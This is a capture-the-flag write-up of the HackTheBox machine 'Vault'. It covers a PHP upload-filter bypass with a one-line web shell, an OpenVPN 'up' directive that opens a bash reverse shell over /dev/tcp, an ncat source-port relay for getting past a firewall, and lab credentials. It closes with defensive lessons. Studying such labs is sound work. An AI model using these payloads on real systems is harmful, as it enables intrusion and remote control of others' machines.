# Vault — HackTheBox

| Field | Detail |
|---|---|
| OS | Linux (Ubuntu 16.04) |
| Difficulty | Medium |
| Date | 2026-03-27 |
| Result | Root — GPG-encrypted flag decrypted |

## Summary

Multi-level pivoting through three separate virtualized environments. PHP upload filter bypass → RCE, OpenVPN config RCE on internal DNS VM, firewall bypass via source port filtering, GPG-encrypted root flag.

## Attack Chain

| # | Step | Technique | Result |
|---|---|---|---|
| 1 | Web Enum | Gobuster | `/sparklays/` discovered |
| 2 | File Upload | PHP filter bypass (.php5) | RCE as `www-data` |
| 3 | Privesc | Credentials in `/home/dave/Desktop` | SSH as `dave` |
| 4 | Pivot | OpenVPN config RCE | Root on `192.168.122.4` |
| 5 | Firewall Bypass | ncat relay source port 53 | Access to Vault:987 |
| 6 | Root Flag | GPG decrypt (`itscominghome`) | `root.txt` decrypted |

## Reconnaissance

```bash
sudo nmap -sC -sV -p- --min-rate 5000 10.129.X.X
# Ports: 22 (SSH), 80 (HTTP)
```

Homepage reveals service name `Slowdaddy` and client name `Sparklays` — used as starting point for enumeration.

## Web Enumeration

```bash
gobuster dir -u http://TARGET/sparklays -w common.txt -x php,html,txt
```

Found: `/sparklays/design/changelogo.php` — unauthenticated file upload.

## PHP Upload Filter Bypass

Form rejects `.php` but Apache 2.4 executes `.php5` and `.phtml`:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php5
# Upload via changelogo.php
# http://TARGET/sparklays/design/uploads/shell.php5?cmd=id
```

RCE as `www-data`. Upgraded to stable shell via `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

## Credentials and SSH

Files found in `/home/dave/Desktop`:

| File | Content | Use |
|---|---|---|
| key | itscominghome | GPG passphrase |
| ssh | dave / Dav3therav3123 | SSH credentials |
| Servers | DNS:122.4 FW:122.5 | Internal network map |

```bash
ssh dave@TARGET  # password: Dav3therav3123
```

## OpenVPN Config RCE

DNS VM at `192.168.122.4` runs a VPN Configurator. OpenVPN's `up` directive executes a command post-connection:

```
script-security 2
nobind
dev null
remote 192.168.122.1
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/6666 0>&1'"
```

Trigger via POST to `?function=testvpn` → root shell on `192.168.122.4`.

## Firewall Bypass and Vault Access

Firewall on `192.168.5.2` accepts connections only from source ports 53 or 4444.

```bash
# ncat relay on DNS VM
ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 4444"

# SSH through relay from ubuntu
ssh -p 1234 dave@192.168.122.4  # password: dav3gerous567
```

Shell is `rbash` but `root.txt.gpg` is readable.

## GPG Decryption

```bash
ssh -p 1234 dave@192.168.122.4 "cat root.txt.gpg" > /tmp/root.txt.gpg
gpg --decrypt /tmp/root.txt.gpg  # passphrase: itscominghome
```

## Network Map

| Host | IP | Access |
|---|---|---|
| ubuntu | 10.129.X.X | SSH dave:Dav3therav3123 |
| DNS VM | 192.168.122.4 | OpenVPN RCE → root |
| Firewall | 192.168.122.5 | Not compromised |
| Vault | 192.168.5.2 | SSH:987 source-port 4444 |

## Lessons Learned

- PHP upload filters must block `.php5`, `.phtml`, `.phar` — not only `.php`
- Never expose an interface that executes arbitrary `.ovpn` files
- Source port firewall rules are bypassed trivially with ncat/socat relays
- GPG-encrypted files are only as safe as their key storage location
